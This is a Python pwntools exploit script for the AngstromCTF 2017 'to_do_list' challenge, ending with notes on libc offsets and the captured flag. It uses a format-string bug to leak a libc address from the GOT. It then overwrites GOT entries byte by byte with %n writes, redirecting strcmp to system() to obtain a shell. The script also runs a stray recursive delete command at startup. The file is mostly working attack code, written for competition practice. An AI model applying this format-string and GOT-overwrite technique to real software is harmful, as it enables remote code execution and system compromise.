#!/usr/bin/env python

import os
from pwn import *

context.update(arch='amd64', os='linux')
os.system("rm christrc -r")
libc_path = "/home/christrc/Dropbox/Pentest_Chall" \
            "/courses-challenges/challenges/CTF/2017/Angstrom/pwn/to_do_list/ld-linux-x86-64.so.2"

p = remote(host="shell.angstromctf.com", port=9000)


# p = process(["./todo_list"], env={"LD_PRELOAD" : libc_path})


def recvbuffer():
    sleep(0.2)
    data = p.recv()
    # print(data)
    return data


def create_list(list_name):
    p.sendline("c")
    recvbuffer()
    p.sendline(list_name + '\n')
    recvbuffer()


def add_to_list(list_name, payload):
    p.sendline("a")
    recvbuffer()
    p.sendline(list_name)
    p.sendline(payload + '\n')
    recvbuffer()


def view_content(list_name):
    p.sendline("v")
    recvbuffer()
    p.sendline(list_name)
    leak = recvbuffer().replace("B" * 11, "")
    return leak


def overwrite(target_address, target_value, addr_size):
    for counter in range(addr_size):
        list_name = "test%s" % counter
        value = str(target_value & 0xff)
        payload = "%" + "%3s" % value + "x%12$n" + 'B' * 6 + pack(target_address + counter)
        create_list(list_name=list_name)
        add_to_list(list_name=list_name, payload=payload)
        view_content(list_name=list_name)
        target_value = (target_value >> 8)


def login(username, password):
    p.sendline('l')
    recvbuffer()
    p.sendline(username)
    recvbuffer()
    p.sendline(password)


def change_password(password):
    p.sendline('p')
    recvbuffer()
    p.sendline(password)
    recvbuffer()


def exit_prog():
    p.sendline('x')
    p.interactive()


offset_getcwd_system = -0xb1b80

p.sendline("christrc")
recvbuffer()
p.sendline("pass")
recvbuffer()

create_list(list_name="test")
payload = "%12$s" + 'B' * 11 + pack(0x602078)  # pack(0x601ff8)
add_to_list(list_name="test", payload=payload)
getcwd = view_content(list_name="test")[:6][::-1].encode("hex")
info("getcwd 0x%s" % getcwd)
system_addr = int(getcwd, 16) + offset_getcwd_system
info("system_address %s" % hex(system_addr))
main = 0x40141f
overwrite(0x6020a0, system_addr, 6)  # strcmp ==> system
overwrite(0x6020c0, main, 3)
exit_prog()
p.interactive()  # user ==> "random" , password ==> "sh"

"""
christrc➜utility/libc_database/libc-database-master» ./find getcwd 0x7fd3a8cfff10                                                                                [21:47:07]
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu7_amd64)
christrc➜utility/libc_database/libc-database-master» ./dump libc6_2.23-0ubuntu7_amd64 getcwd system                                                              [21:47:27]
offset_getcwd = 0x00000000000f6f10
offset_system = 0x0000000000045390



$ cat flag.txt
actf{oh_crap_we_actually_have_to_pay_you}


